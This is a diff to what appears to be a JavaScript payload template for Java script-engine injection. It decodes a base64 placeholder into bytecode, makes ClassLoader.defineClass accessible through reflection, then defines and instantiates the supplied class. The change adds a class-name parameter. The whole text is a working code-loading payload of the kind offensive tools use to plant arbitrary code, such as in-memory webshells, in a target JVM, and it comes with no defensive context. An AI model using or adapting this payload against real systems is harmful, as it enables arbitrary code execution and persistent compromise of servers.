@@ -1,4 +1,5 @@
 var base64Str = "{{base64Str}}";
+var className = "{{className}}";
 var clsString = java.lang.Class.forName("java.lang.String");
 var bytecode;
 try {
@@ -10,7 +11,7 @@ try {
 }
 var clsByteArray = (new java.lang.String("a").getBytes().getClass());
 var clsInt = java.lang.Integer.TYPE;
-var defineClass = java.lang.Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", [clsByteArray, clsInt, clsInt]);
+var defineClass = java.lang.Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", [clsString, clsByteArray, clsInt, clsInt]);
 defineClass.setAccessible(true);
-var clazz = defineClass.invoke(java.lang.Thread.currentThread().getContextClassLoader(), bytecode, new java.lang.Integer(0), new java.lang.Integer(bytecode.length));
+var clazz = defineClass.invoke(java.lang.Thread.currentThread().getContextClassLoader(), className, bytecode, new java.lang.Integer(0), new java.lang.Integer(bytecode.length));
 clazz.newInstance();
